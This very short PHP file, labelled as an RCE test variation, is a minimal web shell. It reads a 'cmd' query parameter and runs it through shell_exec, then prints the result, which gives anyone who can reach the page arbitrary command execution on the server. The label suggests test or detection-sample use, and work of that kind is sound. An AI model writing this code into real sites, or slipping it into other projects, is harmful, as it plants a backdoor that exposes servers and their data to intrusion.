<?php
// RCE test variation #945
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>